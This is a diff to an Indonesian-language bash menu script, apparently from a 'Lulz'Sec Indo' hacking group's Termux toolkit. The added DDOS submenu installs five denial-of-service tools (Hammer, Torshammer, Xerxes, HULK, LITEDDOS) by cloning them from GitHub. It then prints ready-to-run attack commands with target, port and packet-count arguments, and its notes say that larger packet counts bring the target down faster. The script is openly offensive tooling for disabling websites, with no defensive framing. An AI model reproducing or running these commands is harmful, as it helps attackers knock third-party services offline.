@@ -41,6 +41,8 @@ echo $cyan"| Author : Tp.T00k3                                    |"
 echo $cyan"| Friend : Mr.Grim - Sandi LulzSec01 - Mr.CL4Y         |"
 echo $cyan"| Team : Lulz'Sec Indo Team -  Kutu Buku Cyber Network |"
 echo $green"========================================================"
+echo $cyan" DIPILIH COK :)"
+
 echo $green" 00) DDOS"
 echo $green" 01) AOCDEFACE"
 echo $green" 02) D-TECT"
@@ -68,14 +70,134 @@ read -p " root@ErickGansSangad~# " bro;
 if [ $bro = 0 ] || [ $bro = 00 ]
 then
 clear
+#!/system/xbin/bash
+# Bersihkan Layar
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+####################################################
+# CTRL C-
+####################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo $red"[#]> (Ctrl + C ) Detected,
+Trying To Exit ... "
+sleep 1
+echo ""
+echo $yellow"[#]> Thank You For Using My Tools ... "
+sleep 1
+echo ""
+echo $cyan"[#]> Erick Gans Eaaa ... "
+read enter
+exit
+}
 echo $red" Kumpulan Tools DDOS "
 echo $green" 01) Hammer"
 echo $green" 02) Torshammer"
 echo $green" 03) Xerxes"
 echo $green" 04) HULK"
 echo $green" 05) LITEDDOS"
-
 echo $cyan" DIPILIH COK :) "
+read -p " root@ErickGansSangad~# " bro;
+
+if [ $bro = 1 ] || [ $bro = 01 ]
+then
+clear
+echo $red" Installing Hammer "
+sleep 1
+pkg update && pkg upgrade
+pkg install python 
+pkg install git
+git clone https://github.com/cyweb/hammer
+
+echo " Cara Menjalankannya Ketik : "
+echo " $ cd hammer "
+echo " $ python hammer.py "
+echo " $ python hammer.py -s (ip addres) -p 80 -t 135 "
+
+echo $green" BERHASIL_COK "
+fi
+
+if [ $bro = 2 ] || [ $bro = 02 ]
+then
+clear
+echo $red" Installing Torshammer "
+sleep 1
+pkg update && pkg upgrade 
+pkg install python2
+pkg install tor
+pkg install git
+git clone https://github.com/dotfighter/torshammer.git
+
+echo " Cara Menjalankannya Ketik : "
+echo " $ cd torshammer "
+echo " $ chmod +x torshammer.py "
+echo " $ torshammer.py "
+echo " $ python2 torshammer.py - T -t (Website) -p 8080 -r 1000 "
+echo " NOTE : (1000 Itu Bisa Diganti Sesuai Selera Kalian,, Itu Paket Yg Akan Kita Kirimkan Nanti Ketarget,, Makin Besar Paketnya Makin Cepat Downnya) "
+
+echo $green" BERHASIL_COK "
+fi
+
+if [ $bro = 3 ] || [ $bro = 03 ]
+then
+clear
+echo $red" Installing Xerxes "
+sleep 1
+pkg install && pkg upgrade
+pkg install git
+pkg install clang
+git clone https://github.com/zanyarjamal/xerxes
+
+echo " Cara Menjalankannya Ketik : "
+echo " cd xerxes "
+echo " clang xerxes.c -o xerxes "
+echo " $ ./xerxes (URL Website) 80 "
+
+echo $green" BERHASIL_COK "
+fi
+
+if [ $bro = 4 ] || [ $bro = 04 ]
+then
+clear
+echo $red" Installing HULK "
+sleep 1
+pkg update && pkg upgrade
+pkg install python2
+pkg install git 
+git clone https://github.com/crazykid199/Hulk-DDoS-version-2.0
+
+echo " Cara Menjalankannya Ketik : "
+echo " $ cd Hulk-DDoS-version-2.0 "
+echo " $ chmod +x hulkx.py "
+echo " $ python2 hulkx.py URL Website "
+
+echo $green" BERHASIL_COK "
+fi
+
+if [ $bro = 5 ] || [ $bro = 05 ]
+then
+clear
+echo $red" Installing LITEDDOS "
+sleep 1
+pkg update && pkg upgrade
+pkg install python2
+pkg install git
+git clone https://github.com/4L13199/LITEDDOS
+
+echo " Cara Menjalankannya Ketik : "
+echo " $ cd LITEDDOS "
+echo " $ python2 LITEDDOS.py "
+echo " $ python2 LITEDDOS.py (IP Target) 80 1000 "
+echo " NOTE : (1000 Itu Bisa Diganti Sesuai Selera Kalian,, Itu Paket Yg Akan Kita Kirimkan Nanti Ketarget,, Makin Besar Paketnya Makin Cepat Downnya) "
+
+echo $green" BERHASIL_COK "
 fi
 
 if [ $bro = 1 ] || [ $bro = 01 ]
